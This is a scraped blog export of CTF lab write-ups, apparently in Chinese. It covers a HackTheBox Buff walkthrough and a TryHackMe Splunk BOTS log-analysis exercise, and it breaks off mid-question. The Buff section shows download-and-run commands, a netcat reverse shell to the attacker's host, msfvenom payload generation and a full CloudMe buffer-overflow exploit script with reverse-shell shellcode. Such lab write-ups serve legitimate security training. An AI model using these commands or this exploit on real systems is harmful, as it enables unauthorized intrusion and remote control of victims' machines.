AD user password with Linux :: malicious.link — welcomehttps://malicious.link/post/2017/reset-ad-user-password-with-linux/ Some ways to dump LSASS.exe. As always this is for educational… | by Mark Mo | Mediumhttps://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf https://github.com/skelsec/pypykatz Extract credentials from lsass remotely - hackndohttps://en.hackndo.com/remote-lsass-dump-passwords/ https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug HackTheBox Blackfield Writeup - 10.10.10.192 - nav1n.comhttps://www.nav1n.com/2020/06/hackthebox-blackfield-writeup-10-10-10-192/ Hackthebox Blackfield writeup | 0xPrashanthttps://0xprashant.github.io/posts/htb-blackfield/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Buff - HackTheBox","slug":"Buff-HackTheBox","date":"2020-08-03T07:09:18.000Z","updated":"2020-11-23T00:50:27.239Z","comments":true,"path":"2020/08/03/Buff-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/03/Buff-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/263 10.10.10.198 端口扫描直接扫只有8080： 1234567891011121314nmap -sC -sV -Pn 10.10.10.198Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-08-03 13:39 CSTNmap scan report for 10.10.10.198Host is up (0.071s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION8080&#x2F;tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL&#x2F;1.1.1g PHP&#x2F;7.4.6)| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache&#x2F;2.4.43 (Win64) OpenSSL&#x2F;1.1.1g PHP&#x2F;7.4.6|_http-title: mrb3n&#39;s Bro HutService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 46.23 seconds 8080是一个健身房： 页面最底部信息：© Projectworlds.in 搜索能够发现： https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/ 应该就是用这个开源系统做的，并且concat界面显示版本信息： 直接搜索能够发现一个未授权RCE： RCE get userexp直接打： reverse shell然后传个nc，reverse shell方便操作： 12powershell -c \"wget 10.10.14.15:8888/nc.exe -o nc.exe\"nc.exe -e cmd.exe 10.10.14.15 7777 提权信息Shaun用户Downloads目录有个CloudMe_1112.exe： 搜搜能够得到一个BOF： CloudMe 1.11.2 - Buffer Overflow (PoC) - Windows remote Exploithttps://www.exploit-db.com/exploits/48389 12345678tasklist /v...CloudMe.exe 5508 0 13,164 K Unknown N/A...netstat -anop TCP... TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 7712... 因为是在127.0.0.1的8888端口，需要先把端口转发出来 port forward当然是用meterpreter比较方便，但OSCP只能用一次msf，所以尽量不用。 转发工具用的这个： https://github.com/jpillora/chisel 1powershell -c \"wget 10.10.14.15:8888/chisel.exe -o chisel.exe\" 12345# local./chisel_1.7.0-rc7_darwin_amd64 server -p 8080 --reverse# target.\\chisel.exe client 10.10.14.15:8080 R:8888:127.0.0.1:8888 然后访问我们本机的8888就相当于访问target的8888 Buffer Overflowexploit db找到的exp是弹计算器的，注释里有 1msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\\x00\\x0A\\x0D' -f python 我们需要修改成shell的： 1msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=7778 EXITFUNC=thread -b \"\\x00\\x0d\\x0a\" -f python exp.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import sockettarget = \"127.0.0.1\"padding1 = b\"\\x90\" * 1052EIP = b\"\\xB5\\x42\\xA8\\x68\" # 0x68A842B5 -&gt; PUSH ESP, RETNOPS = b\"\\x90\" * 30# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=7778 EXITFUNC=thread -b \"\\x00\\x0d\\x0a\" -f pythonbuf = b\"\"buf += b\"\\xdb\\xc1\\xd9\\x74\\x24\\xf4\\x5b\\xb8\\x85\\x9d\\xb3\\xab\\x33\"buf += b\"\\xc9\\xb1\\x52\\x83\\xeb\\xfc\\x31\\x43\\x13\\x03\\xc6\\x8e\\x51\"buf += b\"\\x5e\\x34\\x58\\x17\\xa1\\xc4\\x99\\x78\\x2b\\x21\\xa8\\xb8\\x4f\"buf += b\"\\x22\\x9b\\x08\\x1b\\x66\\x10\\xe2\\x49\\x92\\xa3\\x86\\x45\\x95\"buf += b\"\\x04\\x2c\\xb0\\x98\\x95\\x1d\\x80\\xbb\\x15\\x5c\\xd5\\x1b\\x27\"buf += b\"\\xaf\\x28\\x5a\\x60\\xd2\\xc1\\x0e\\x39\\x98\\x74\\xbe\\x4e\\xd4\"buf += b\"\\x44\\x35\\x1c\\xf8\\xcc\\xaa\\xd5\\xfb\\xfd\\x7d\\x6d\\xa2\\xdd\"buf += b\"\\x7c\\xa2\\xde\\x57\\x66\\xa7\\xdb\\x2e\\x1d\\x13\\x97\\xb0\\xf7\"buf += b\"\\x6d\\x58\\x1e\\x36\\x42\\xab\\x5e\\x7f\\x65\\x54\\x15\\x89\\x95\"buf += b\"\\xe9\\x2e\\x4e\\xe7\\x35\\xba\\x54\\x4f\\xbd\\x1c\\xb0\\x71\\x12\"buf += b\"\\xfa\\x33\\x7d\\xdf\\x88\\x1b\\x62\\xde\\x5d\\x10\\x9e\\x6b\\x60\"buf += b\"\\xf6\\x16\\x2f\\x47\\xd2\\x73\\xeb\\xe6\\x43\\xde\\x5a\\x16\\x93\"buf += b\"\\x81\\x03\\xb2\\xd8\\x2c\\x57\\xcf\\x83\\x38\\x94\\xe2\\x3b\\xb9\"buf += b\"\\xb2\\x75\\x48\\x8b\\x1d\\x2e\\xc6\\xa7\\xd6\\xe8\\x11\\xc7\\xcc\"buf += b\"\\x4d\\x8d\\x36\\xef\\xad\\x84\\xfc\\xbb\\xfd\\xbe\\xd5\\xc3\\x95\"buf += b\"\\x3e\\xd9\\x11\\x39\\x6e\\x75\\xca\\xfa\\xde\\x35\\xba\\x92\\x34\"buf += b\"\\xba\\xe5\\x83\\x37\\x10\\x8e\\x2e\\xc2\\xf3\\xbb\\xa4\\xc2\\x0c\"buf += b\"\\xd4\\xba\\xda\\x0c\\x46\\x32\\x3c\\x5a\\x96\\x12\\x97\\xf3\\x0f\"buf += b\"\\x3f\\x63\\x65\\xcf\\x95\\x0e\\xa5\\x5b\\x1a\\xef\\x68\\xac\\x57\"buf += b\"\\xe3\\x1d\\x5c\\x22\\x59\\x8b\\x63\\x98\\xf5\\x57\\xf1\\x47\\x05\"buf += b\"\\x11\\xea\\xdf\\x52\\x76\\xdc\\x29\\x36\\x6a\\x47\\x80\\x24\\x77\"buf += b\"\\x11\\xeb\\xec\\xac\\xe2\\xf2\\xed\\x21\\x5e\\xd1\\xfd\\xff\\x5f\"buf += b\"\\x5d\\xa9\\xaf\\x09\\x0b\\x07\\x16\\xe0\\xfd\\xf1\\xc0\\x5f\\x54\"buf += b\"\\x95\\x95\\x93\\x67\\xe3\\x99\\xf9\\x11\\x0b\\x2b\\x54\\x64\\x34\"buf += b\"\\x84\\x30\\x60\\x4d\\xf8\\xa0\\x8f\\x84\\xb8\\xc1\\x6d\\x0c\\xb5\"buf += b\"\\x69\\x28\\xc5\\x74\\xf4\\xcb\\x30\\xba\\x01\\x48\\xb0\\x43\\xf6\"buf += b\"\\x50\\xb1\\x46\\xb2\\xd6\\x2a\\x3b\\xab\\xb2\\x4c\\xe8\\xcc\\x96\"overrun = b\"C\" * (1500 - len(padding1 + NOPS + EIP + buf)) buf = padding1 + EIP + NOPS + buf + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf)except Exception as e: print(sys.exc_value) root flagBOF打到administrator shell，得到root.txt: 参考资料 CloudMe 1.11.2 - Buffer Overflow (PoC) - Windows remote Exploithttps://www.exploit-db.com/exploits/48389 https://github.com/jpillora/chisel HackTheBox - Buff | p0i5on8https://p0i5on8.github.io/posts/hackthebox-buff/ Hackthebox Buff writeup | 0xPrashanthttps://0xprashant.github.io/posts/htb-buff/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"BP-Splunk-TryHackMe","slug":"BP-Splunk-TryHackMe","date":"2020-07-30T06:24:37.000Z","updated":"2020-07-30T06:42:09.151Z","comments":true,"path":"2020/07/30/BP-Splunk-TryHackMe/","link":"","permalink":"https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/","excerpt":"","text":"基本信息 https://tryhackme.com/room/bpsplunk 1.Deploy12Username: splunkUserPassword: SplunkUser#321 启动，等待，访问BOX_IP:8000 2. Can you dig it?Splunk的基本搜索命令，主要参考官方文档和Google 2.1 query commandsplunk query一般以什么命令开头： 1search 2.2 显示字段出现次数最少的值在搜索值时，在安全性范围内查找不常见的事件是相当典型的。 我们可以在搜索中包括哪些命令来查找这些命令？ 1rare, 显示字段出现次数最少的值 2.3 显示字段出现次数最多的值反过来，如果我们想要最常见的安全事件怎么办？ 1top, 显示字段出现次数最多的值 2.4 导入数据存储位置当我们将数据导入splunk时，其存储在什么位置？ 1index 2.5 相同的搜索条件我们可以创建“views”，使我们能够一遍又一遍地反复进行相同的搜索； 这些叫什么？ 1dashboard 2.6 排除重复数据导入数据并不总是按计划进行，有时我们可能会获得同一数据的多个副本，我们在搜索中排除这些副本的命令是什么？ 1dedup 2.7 事件持续时间Splunk不仅可以用于SIEM，而且还可以广泛用于市场营销以跟踪诸如网站购物之旅从开始到结束的持续时间之类的事情。 我们可以在搜索中使用什么命令来跟踪这些事件对花费多长时间？ 2.8 管道类似于Linux的方式，我们可以将搜索结果“输送”到其他命令中，为此使用什么字符？ 1| 2.9 相关事件图在使用Splunk执行数据分析时，跟踪随时间推移发生的事件很有用，我们包括哪些命令来绘制此图？ 2.10 一般统计信息如果我们想收集有关搜索的一般统计信息怎么办？ 1stats 2.11 数据结构导入到Splunk中的数据分为几列，这些被称为什么？ 1fields 2.12 数据来源当我们将数据导入Splunk时，我们可以看到它的来源，这叫什么？ 这里是分析主机数据。 1host 2.13 数据源当我们将数据导入Splunk时，我们可以从系统内部查看其起源点，这叫什么？ 1source 2.14 源点分组我们可以对这些起源点进行分类，并将它们分组在一起，将它们视为特定类型。 这个叫什么？ 使用在搜索查询中找到的语法，而不是为此使用适当的名称。 1sourcetype 2.15 函数搜索在对数据执行函数搜索时，我们在评估本身之前使用特定命令，该命令是什么？ 2.16 正则表达式喜欢它还是讨厌它，正则表达式是Splunk的重要组成部分，我们在搜索中对特定的正则表达式使用什么命令？ 1rex 2.17 子集和特定视图为不那么熟练的Splunk用户创建子集和特定视图是很普遍的，这些被称为什么？ 1pivot table 2.18 时间日期字段Splunk中时间日期字段的专有名称是什么 1_time 2.19 前几个值如何只得到在搜索中找到的前几个值？ 1head 2.20 反转顺序比您想象的还要有用，如何反转返回结果的顺序？ 1reverse 2.21 重命名字段查看搜索结果时，通常使用用户提供的值表来重命名字段。 我们要在搜索中包括哪些命令来执行此操作？ 1lookup 2.22 特定时间范围我们可以将事件收集到特定的时间范围中，以用于进一步处理。 我们要在搜索中包括什么命令来做到这一点？ 1bucket 2.23 图表使用特定时间长度我们还可以将数据定义为要在图表命令中使用的特定时间段，我们使用什么命令来设置这些时间长度？ 这与之前的问题不同，因为我们不再收集进行进一步处理。 1span 2.24 事件统计数量在生成有关搜索的统计信息时，通常对事件的发生进行计数，我们包括执行此命令的命令是什么？ 1count 2.25 splunk apps最后但并非最不重要的一点是，您可以在哪里找到Splunk应用程序的网站？ 2.26 添加新功能我们还可以将新功能添加到Splunk中，这些新功能是什么？ 1apps 2.27 SOC含义SOC代表什么？ 1security operations center 2.28 SIEM含义SIEM代表什么？ 1security information events management 2.29 BOTS含义BOTS呢？ 1boss of the soc 2.30 CIM含义CIM呢？ 1common information model 2.31 Splunk论坛您可以在哪里找到Splunk论坛的网站？ 1answers.splunk.com 3. BOTS在通过命令测验对Splunk进行了令人愉快的介绍之后，我们将访问Splunk在其”Boss of the SOC”安全运营中心竞赛中直接生成的一些培训材料！ https://www.splunk.com/en_us/blog/security/what-you-need-to-know-about-boss-of-the-soc.html 4. Halp, I’m drowning in logs!就是介绍下Investigating with Splunk Workshop 以及ATT&amp;CK 5. Advanced Persistent Threat根据提供的数据追踪P01s0n1vy! 5.1 What IP is scanning our web server?需要找出扫描来源IP，首先查看index： 1* | stats count by index index count botsv1 955807 main 479 两个index，首先看一下main，根据source筛选排序： 123* index&#x3D;main | stats count by source | sort -count source count stream:Splunk_HTTPURI 345 stream:Splunk_IP 49 stream:Splunk_HTTPStatus 31 stream:Splunk_Udp 18 stream:Splunk_HTTPClient 10 stream:Splunk_HTTPResponseTime 10 stream:Splunk_Tcp 10 stream:Splunk_DNSIntegrity 8 stream:Splunk_DNSRequestResponse 6 stream:Splunk_DNSServerQuery 6 stream:Splunk_DNSServerResponse 6 stream:Splunk_DNSClientQueryTypes 3 最多的是HTTPURI 然后再看一下另一个index： 1234* index&#x3D;botsv1| stats count by source | sort -count | head 10 source count WinEventLog:Microsoft-Windows-Sysmon/Operational 270597 stream:smb 151568 /var/log/suricata/eve.json 125584 WinEventLog:Security 87430 udp:514 80922 WinRegistry 74720 stream:ip 62083 stream:tcp 28291 stream:http 23936 C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex160810.log 22401 里面有stream:http，直接使用这个筛选排序： 123index&#x3D;botsv1 sourcetype&#x3D;stream:http | stats count by src_ip | sort -count src_ip count 40.80.148.42 20997 23.22.63.114 1430 192.168.2.50 818 192.168.250.100 265 192.168.250.70 8 第一个的count明显非常大，得到扫描器IP 5.2 What web scanner scanned the server?判断是什么扫描器，那就是常规的直接看HTTP Header： 1234index&#x3D;botsv1 sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; | stats count by src_headers | sort -count | head 3 src_headers count POST /joomla/index.php/component/search/ HTTP/1.1 Content-Length: 99 Content-Type: application/x-www-form-urlencoded Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3 Host: imreallynotbatman.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition) Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm Accept: / 99 POST /joomla/index.php/component/search/ HTTP/1.1 Content-Length: 101 Content-Type: application/x-www-form-urlencoded Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3 Host: imreallynotbatman.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition) Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm Accept: / 97 POST /joomla/index.php/component/search/ HTTP/1.1 Content-Length: 102 Content-Type: application/x-www-form-urlencoded Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3 Host: imreallynotbatman.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition) Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm Accept: / 97 很明显是AWVS，答案是”acunetix” 5.3 What is the IP address of our web server?问我们的web server ip地址，那就是看dest_ip： 123index&#x3D;botsv1 sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; | stats count by dest_ip | sort -count dest_ip count 192.168.250.70 20996 192.168.250.40 1 很明显是192.168.250.70 5.4 What content management system is imreallynotbatman.com using?我们的web是imreallynotbatman.com，前面的搜索参考资料里就加有这个关键词，不过测试环境没其他数据干扰不加也没影响。 这里是问我们的web用的是哪种CMS，首先查看下URI格式： 1234index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot;| stats count by uri | sort -count | head 10 uri count /joomla/index.php/component/search/ 14218 /joomla/index.php 798 / 517 /windows/win.ini 33 /joomla/media/jui/js/jquery-migrate.min.js 18 /joomla/media/jui/js/jquery-noconflict.js 18 /joomla/administrator/index.php 17 /joomla/media/jui/js/bootstrap.min.js 17 /joomla/media/system/js/html5fallback.js 13 /joomla/templates/protostar/js/template.js 13 明显的joomla 5.5 What address is performing the brute-forcing attack against our website?问哪个地址在进行爆破，首先使用扫描器的IP进行筛选分析method，因为扫描器的请求比较全面： 123index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; | stats count by http_method | sort -count http_method count POST 15146 GET 5766 OPTIONS 5 CONNECT 1 PROPFIND 1 TRACE 1 最多的是POST，正常登录类就是POST比较多。 然后筛选出登录相关请求格式，这里就是dest_content： 123index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; http_method&#x3D;&quot;POST&quot; username | table dest_content | head 1 123456789101112131415161718192021222324&lt;form action&#x3D;&quot;&#x2F;joomla&#x2F;administrator&#x2F;index.php&quot; method&#x3D;&quot;post&quot; id&#x3D;&quot;form-login&quot; class&#x3D;&quot;form-inline&quot;&gt; [REDACTED] &lt;input name&#x3D;&quot;username&quot; tabindex&#x3D;&quot;1&quot; id&#x3D;&quot;mod-login-username&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input-medium&quot; placeholder&#x3D;&quot;Username&quot; size&#x3D;&quot;15&quot; autofocus&#x3D;&quot;true&quot; &#x2F;&gt; [REDACTED] &lt;input name&#x3D;&quot;passwd&quot; tabindex&#x3D;&quot;2&quot; id&#x3D;&quot;mod-login-password&quot; type&#x3D;&quot;password&quot; class&#x3D;&quot;input-medium&quot; placeholder&#x3D;&quot;Password&quot; size&#x3D;&quot;15&quot;&#x2F;&gt; [REDACTED] &lt;button tabindex&#x3D;&quot;3&quot; class&#x3D;&quot;btn btn-primary btn-block btn-large&quot;&gt; &lt;span class&#x3D;&quot;icon-lock icon-white&quot;&gt;&lt;&#x2F;span&gt; Log in &lt;&#x2F;button&gt; [REDACTED] &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;option&quot; value&#x3D;&quot;com_login&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;task&quot; value&#x3D;&quot;login&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;return&quot; value&#x3D;&quot;aW5kZXgucGhw&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;da4c70bcedf77f722881e18fb076b963&quot; value&#x3D;&quot;1&quot; &#x2F;&gt; &lt;&#x2F;fieldset&gt;&lt;&#x2F;form&gt;[REDACTED] 主要就是username和passwd 然后使用这个条件筛选： 12index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* | stats count by src_ip src_ip count 23.22.63.114 412 40.80.148.42 1 扫描器没进行爆破，爆破的是23.22.63.114 5.6 What was the first password attempted in the attack?攻击中尝试输入的第一个密码是什么，那就是正则提取出用户名密码，根据时间排序： 123456index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;username&#x3D;(?&lt;u&gt;\\w+)&quot; | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\\w+)&quot; | table _time, u, p | sort by _time| head 5 _time u p 2016/08/10 21:45:21.226 admin 12345678 2016/08/10 21:45:21.241 admin letmein 2016/08/10 21:45:21.247 admin qwerty 2016/08/10 21:45:21.250 admin 1234 2016/08/10 21:45:21.260 admin 123456 5.7 One of the passwords in the brute force attack is James Brodsky’s favorite Coldplay song. Which six character song is it?暴力破解的密码之一是詹姆斯·布罗德斯基（James Brodsky）最喜欢的Coldplay歌曲。 歌名六个字符？ 这个首先去https://en.wikipedia.org/wiki/List_of_songs_recorded_by_Coldplay，去把所有歌名做成csv，然后导入到splunk里作为Lookups： 1| inputlookup coldplay.csv 然后把密码中所有6个字符过滤出来在lookup里查找： 12345678index&#x3D;botsv1 sourcetype&#x3D;stream:http form_data&#x3D;*username*passwd*| rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;userpassword&gt;\\w+)&quot;| eval lenpword&#x3D;len(userpassword)| search lenpword&#x3D;6| eval password&#x3D;lower(userpassword)| lookup coldplay.csv song as password OUTPUTNEW song| search song&#x3D;*| table song Answer: yellow 5.8 What was the correct password for admin access to the content management system running imreallynotbatman.com?管理员访问运行imreallynotbatman.com的CMS的正确密码是什么？ 因为错误密码都只尝试一次，简单过滤一下就可以： 123456index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\\w+)&quot; | stats count by p | sort -count| table p,count| head 10 p count batman 2 000000 1 1111 1 111111 1 11111111 1 112233 1 1212 1 121212 1 123123 1 1234 1 正确密码是”batman” 5.9 What was the average password length used in the password brute forcing attempt rounded to closest whole integer?密码暴力破解尝试中使用的平均密码长度是多少？四舍五入到最接近的整数. 123456index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\\w+)&quot; | eval pl&#x3D;len(p) | stats avg(pl) as av| eval avg_count&#x3D;round(av,0) | table avg_count avg_count 6 5.10 How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login rounded to 2 decimal places?从爆破出正确密码到开始扫描(扫描器配置正确密码)中间间隔多少秒，两位小数。 1234index&#x3D;botsv1 sourcetype&#x3D;stream:http form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\\w+)&quot; | search p&#x3D;&quot;batman&quot; | table _time, p, src_ip| sort by _time _time p src_ip 2016/08/10 21:46:33.689 batman 23.22.63.114 2016/08/10 21:48:05.858 batman 40.80.148.42 12345index&#x3D;botsv1 sourcetype&#x3D;stream:http form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\\w+)&quot; | search p&#x3D;&quot;batman&quot; | transaction p| eval dur&#x3D;round(duration,2)| table dur dur 92.17 5.11 How many unique passwords were attempted in the brute force attempt?蛮力尝试中尝试了多少个不同的密码？ 1234index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\\w+)&quot; | dedup p | stats count count 412 5.12 What is the name of the executable uploaded by P01s0n1vy?P01s0n1vy上传的可执行文件的名称是什么？ 首先过滤出上传请求格式： 12index&#x3D;botsv1 sourcetype&#x3D;stream:http dest&#x3D;&quot;192.168.250.70&quot; &quot;multipart&#x2F;form-data&quot; | head 1 得到： 123...part_filename&quot;:[&quot;3791.exe&quot;,&quot;agent.php&quot;]... 然后使用这个条件进行搜索： 12index&#x3D;botsv1 sourcetype&#x3D;stream:http dest&#x3D;&quot;192.168.250.70&quot; &quot;multipart&#x2F;form-data&quot; | stats count by part_filename&#123;&#125; part_filename{} count 3791.exe 1 agent.php 1 5.13 What is the MD5 hash of the executable uploaded?上传的可执行文件的md5 hash。 首先搜索确认sourcetype： 1index&#x3D;botsv1 3791.exe md5 | stats count by sourcetype sourcetype count XmlWinEventLog:Microsoft-Windows-Sysmon/Operational 67 然后条件搜索： 123index&#x3D;botsv1 3791.exe sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; CommandLine&#x3D;&quot;3791.exe&quot;| rex field&#x3D;_raw MD5&#x3D;&quot;(?&lt;md5sum&gt;\\w+)&quot; | table md5sum md5sum AAE3F5A29935E6ABCC2C2754D12A9AF0 5.14 What is the name of the file that defaced the imreallynotbatman.com website?破坏了imreallynotbatman.com网站的文件的名称是什么？ 这里是攻击者利用漏洞把自己的文件下载到了我们的server，所以攻击者的ip是dest： 123index&#x3D;botsv1 sourcetype&#x3D;&quot;suricata&quot; src_ip&#x3D;&quot;192.168.250.70&quot; dest_ip&#x3D;&quot;23.22.63.114&quot; | stats count by http.http_method, http.hostname, http.url | sort -count http.http_method http.hostname http.url count GET imreallynotbatman.com /joomla/administrator/index.php 824 POST imreallynotbatman.com /joomla/administrator/index.php 411 GET 71.39.18.126 /joomla/agent.php 52 GET prankglassinebracket.jumpingcrab.com /poisonivy-is-coming-for-you-batman.jpeg 3 Answer: poisonivy-is-coming-for-you-batman.jpeg 5.15 This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?该攻击使用动态DNS解析为恶意IP。 与此攻击相关的是什么完全限定域名（FQDN）？ 前面的查询已经得到了结果 ： prankglassinebracket.jumpingcrab.com 5.16 What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?P01s0n1vy已将哪些IP地址绑定到已预先准备好攻击Wayne Enterprises的域？ Answer: 23.22.63.114 5.17 Based on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with P01s0n1vy APT group?根据从此次攻击和通用的开源域名情报来源收集的数据，最可能与P01s0n1vy APT组相关联的电子邮件地址是什么？ 在线的IOC查询 https://threatcrowd.org/ip.php?ip=23.22.63.114 Answer: lillian.rose@po1s0n1vy.com 5.18 GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the P01s0n1vy APT group if initial compromise fails is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to P01s0n1vy’s initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.GCPD报告说，如果最初的攻击失败，则P01s0n1vy APT组的常见TTP（战术，技术，规程）是发送带有自定义恶意软件的鱼叉式网络钓鱼电子邮件，并附有其预定目标。 该恶意软件通常连接到P01s0n1vy的初始攻击基础结构。 使用研究技术，提供此恶意软件的SHA256哈希。 https://www.threatminer.org/host.php?q=23.22.63.114 这里有一些相关文件hash，其中c99131e0169171935c5ac32615ed6261被检测为malicious，这个文件详情里https://www.threatminer.org/sample.php?q=c99131e0169171935c5ac32615ed6261有sha256: 9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8 5.19 What special hex code is associated with the customized malware discussed in the previous question?上一个问题中讨论的定制恶意软件有哪些特殊的十六进制代码？ VT中有相关资料： https://www.virustotal.com/gui/file/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8/community 153 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21 5.20 What does this hex code decode to?此十六进制代码将解码为什么？ 12$ echo \"53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21\" | xxd -r -pSteve Brant's Beard is a powerful thing. Find this message and ask him to buy you a beer!!! 6. Ransomware这部分是分析勒索病毒的 6.1 What was the most likely IP address of we8105desk on 24AUG2016?在2016年8月24日，we8105desk最可能的IP地址是什么？ 时间过滤器设置为08/24/2016，搜索语句过滤。 首先查看sourcetype： 123index&#x3D;botsv1 we8105desk | stats count by sourcetype| sort -count sourcetype count XmlWinEventLog:Microsoft-Windows-Sysmon/Operational 104360 wineventlog 10028 stream:smb 1528 stream:ldap 48 nessus:scan 24 WinRegistry 3 然后就是统计IP： 123index&#x3D;botsv1 we8105desk sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot;| stats count by src_ip| sort-count src_ip count 192.168.250.100 52270 192.168.250.255 69 127.0.0.1 66 0.0.0.0 42 224.0.0.252 6 192.168.250.70 1 答案很明显，192.168.250.100 6.2 What is the name of the USB key inserted by Bob Smith?Bob Smith插入的USB key的名称是什么？ USB key这个是注册表中有信息，根据文档 https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/usb-device-specific-registry-settings 是在HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USB里面的FriendlyName 直接搜索： 12index&#x3D;botsv1 sourcetype&#x3D;WinRegistry friendlyname | stats count by registry_value_data registry_value_data count MIRANDA_PRI 2 6.3 After the USB insertion, a file execution occurs that is 